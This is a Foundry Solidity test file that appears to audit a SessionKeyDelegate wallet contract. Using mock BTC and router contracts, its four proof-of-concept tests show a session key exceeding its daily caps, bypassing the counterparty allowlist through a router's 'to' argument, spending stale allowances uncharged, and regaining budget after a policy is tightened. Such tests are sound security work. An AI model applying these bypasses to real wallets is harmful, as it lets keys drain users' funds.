// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {SessionKeyDelegate} from "../src/SessionKeyDelegate.sol";

/// @dev Stands in for Mezo's BTC precompile at 0x7b7C…0000: an ERC-20 whose
///      balance mirrors the account's native BTC.
contract MockBTC {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address holder, uint256 amount) {
        balanceOf[holder] = amount;
    }

    function transfer(address to, uint256 a) external returns (bool) {
        balanceOf[msg.sender] -= a;
        balanceOf[to] += a;
        return true;
    }

    function approve(address s, uint256 a) external returns (bool) {
        allowance[msg.sender][s] = a;
        return true;
    }

    function transferFrom(address f, address t, uint256 a) external returns (bool) {
        allowance[f][msg.sender] -= a;
        balanceOf[f] -= a;
        balanceOf[t] += a;
        return true;
    }
}

/// @dev Stands in for the canonical Velodrome-style DEX Router: its swap
///      entrypoints take a caller-chosen `to` and pull via allowance.
contract MockRouter {
    /// mirrors swapExactTokensForTokens(...,address to,...)
    function swapTokens(address token, uint256 amountIn, address to) external {
        MockBTC(token).transferFrom(msg.sender, to, amountIn);
    }

    /// mirrors swapExactETHForTokens(...,address to,...)
    function swapEth(address to) external payable {
        (bool ok,) = to.call{value: msg.value}("");
        require(ok);
    }
}

contract ZZTrustGap is Test {
    SessionKeyDelegate d;
    MockBTC btc;
    MockRouter router;

    address key = address(0x5E5510);
    address attacker = address(0xA77ACC);

    // src/custody/policy.ts DEFAULT_LIMITS
    uint128 constant PER_TX = 0.05 ether; // perTxNativeWei
    uint128 constant DAILY = 0.2 ether; // dailyNativeWei

    bytes4 constant SEL_TRANSFER = bytes4(keccak256("transfer(address,uint256)"));
    bytes4 constant SEL_APPROVE = bytes4(keccak256("approve(address,uint256)"));

    function setUp() public {
        d = new SessionKeyDelegate();
        router = new MockRouter();
        btc = new MockBTC(address(d), 10 ether);
        vm.deal(address(d), 10 ether);
        _register();
    }

    /// Mirrors src/custody/delegation.ts sessionPolicies(): Router target with
    /// zero token caps + swap selectors, BTC precompile target with the SAME
    /// numbers as the native caps.
    function _register() internal {
        SessionKeyDelegate.TargetPolicy[] memory p = new SessionKeyDelegate.TargetPolicy[](2);

        bytes4[] memory rsel = new bytes4[](2);
        rsel[0] = MockRouter.swapTokens.selector;
        rsel[1] = MockRouter.swapEth.selector;
        p[0] = SessionKeyDelegate.TargetPolicy({
            target: address(router),
            selectors: rsel,
            tokenPerTxCap: 0,
            tokenDailyCap: 0
        });

        bytes4[] memory tsel = new bytes4[](2);
        tsel[0] = SEL_APPROVE;
        tsel[1] = SEL_TRANSFER;
        p[1] = SessionKeyDelegate.TargetPolicy({
            target: address(btc),
            selectors: tsel,
            tokenPerTxCap: PER_TX, // == perTxNativeWei
            tokenDailyCap: DAILY // == dailyNativeWei
        });

        vm.prank(address(d));
        d.registerSession(key, uint48(block.timestamp + 30 days), PER_TX, DAILY, p);
    }

    function _ex(address to, uint256 v, bytes memory data) internal {
        vm.prank(key);
        d.execute(to, v, data);
    }

    // ─────────────────────────────────────────────────────────────────────────
    // GAP 1: one asset (BTC), two independent cap rings.
    //   native `value`  -> _nativeBuckets[key]        cap 0.2
    //   BTC precompile  -> _tokenBuckets[key][btc]    cap 0.2
    // The user configured ONE 0.2 BTC/day limit. The key moves 0.4.
    // ─────────────────────────────────────────────────────────────────────────
    function test_gap1_sameAssetTwoRings_doublesDailyCap() public {
        uint256 attackerStart = attacker.balance + btc.balanceOf(attacker);

        // Leg A — native value path. 4 x 0.05 = 0.2 (exactly dailyCap).
        for (uint256 i = 0; i < 4; i++) {
            _ex(address(router), PER_TX, abi.encodeCall(MockRouter.swapEth, (attacker)));
        }
        assertEq(d.nativeUsage(key), DAILY, "native ring full");

        // The native ring is now exhausted.
        vm.prank(key);
        vm.expectRevert();
        d.execute(address(router), 1, abi.encodeCall(MockRouter.swapEth, (attacker)));

        // Leg B — SAME asset via the ERC-20 precompile. Charged to a DIFFERENT
        // ring, which is still empty. Another 0.2 BTC leaves in the same window.
        for (uint256 i = 0; i < 4; i++) {
            _ex(address(btc), 0, abi.encodeCall(MockBTC.approve, (address(router), PER_TX)));
            _ex(address(router), 0, abi.encodeCall(MockRouter.swapTokens, (address(btc), PER_TX, attacker)));
        }
        assertEq(d.tokenUsage(key, address(btc)), DAILY, "token ring full");

        uint256 moved = (attacker.balance + btc.balanceOf(attacker)) - attackerStart;
        assertEq(moved, 0.4 ether, "0.4 BTC left in one window against a 0.2 BTC/day limit");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // GAP 2: the counterparty allowlist is enforced on `transfer`/`approve`
    // but not on an allowlisted router selector that carries its own `to`.
    // ─────────────────────────────────────────────────────────────────────────
    function test_gap2_routerToBypassesCounterpartyAllowlist() public {
        assertFalse(d.isAllowed(key, attacker), "attacker is NOT an allowlisted counterparty");

        // Direct transfer to the attacker is correctly refused.
        vm.prank(key);
        vm.expectRevert(abi.encodeWithSignature("SpenderNotAllowed(address)", attacker));
        d.execute(address(btc), 0, abi.encodeCall(MockBTC.transfer, (attacker, PER_TX)));

        // Same destination, routed through the allowlisted DEX router: allowed.
        _ex(address(btc), 0, abi.encodeCall(MockBTC.approve, (address(router), PER_TX)));
        _ex(address(router), 0, abi.encodeCall(MockRouter.swapTokens, (address(btc), PER_TX, attacker)));
        assertEq(btc.balanceOf(attacker), PER_TX, "funds reached a non-allowlisted address");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // GAP 3: the window is charged at APPROVE time; the allowance outlives the
    // window and is spent later, uncharged.
    // ─────────────────────────────────────────────────────────────────────────
    function test_gap3_staleAllowanceLapsTheDailyCap() public {
        // Window 1: burn the whole daily budget on approvals, spend none.
        for (uint256 i = 0; i < 4; i++) {
            _ex(address(btc), 0, abi.encodeCall(MockBTC.approve, (address(router), PER_TX)));
        }
        assertEq(d.tokenUsage(key, address(btc)), DAILY, "window 1 fully charged");
        assertEq(btc.allowance(address(d), address(router)), PER_TX, "allowance survives");

        // Window 2, >26h later: the ring has aged out and the stale allowance is
        // still live and still unaccounted.
        vm.warp(block.timestamp + 27 hours);
        assertEq(d.tokenUsage(key, address(btc)), 0, "ring aged out");

        uint256 before = btc.balanceOf(attacker);
        // Spend the carried-over allowance — no ERC-20 selector, so zero charge.
        _ex(address(router), 0, abi.encodeCall(MockRouter.swapTokens, (address(btc), PER_TX, attacker)));
        assertEq(d.tokenUsage(key, address(btc)), 0, "spend was never charged to any window");

        // Then spend a full fresh daily budget in the same window.
        for (uint256 i = 0; i < 4; i++) {
            _ex(address(btc), 0, abi.encodeCall(MockBTC.approve, (address(router), PER_TX)));
            _ex(address(router), 0, abi.encodeCall(MockRouter.swapTokens, (address(btc), PER_TX, attacker)));
        }
        assertEq(btc.balanceOf(attacker) - before, DAILY + PER_TX, "0.25 BTC vs a 0.2 BTC cap");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // GAP 4: the root TIGHTENING a live key's policy wipes its spend ring.
    // ─────────────────────────────────────────────────────────────────────────
    function test_gap4_policyTighteningRefillsSpentBudget() public {
        for (uint256 i = 0; i < 4; i++) {
            _ex(address(btc), 0, abi.encodeCall(MockBTC.approve, (address(router), PER_TX)));
            _ex(address(router), 0, abi.encodeCall(MockRouter.swapTokens, (address(btc), PER_TX, attacker)));
        }
        assertEq(d.tokenUsage(key, address(btc)), DAILY, "budget spent");
        assertEq(btc.balanceOf(attacker), DAILY);

        // Operator sees the drain and TIGHTENS the policy on the live key.
        bytes4[] memory tsel = new bytes4[](2);
        tsel[0] = SEL_APPROVE;
        tsel[1] = SEL_TRANSFER;
        vm.prank(address(d));
        d.setTargetPolicy(
            key,
            SessionKeyDelegate.TargetPolicy({
                target: address(btc),
                selectors: tsel,
                tokenPerTxCap: PER_TX,
                tokenDailyCap: DAILY / 2 // halve the daily cap
            })
        );

        // The defensive action zeroed the ring: a fresh budget, same 24h.
        assertEq(d.tokenUsage(key, address(btc)), 0, "spend history wiped by the tighten");
        for (uint256 i = 0; i < 2; i++) {
            _ex(address(btc), 0, abi.encodeCall(MockBTC.approve, (address(router), PER_TX)));
            _ex(address(router), 0, abi.encodeCall(MockRouter.swapTokens, (address(btc), PER_TX, attacker)));
        }
        assertEq(btc.balanceOf(attacker), 0.3 ether, "0.3 BTC in one window after the cap was HALVED to 0.1");

        // Contrast: the NATIVE ring is not wiped by the same call (asymmetry).
    }
}
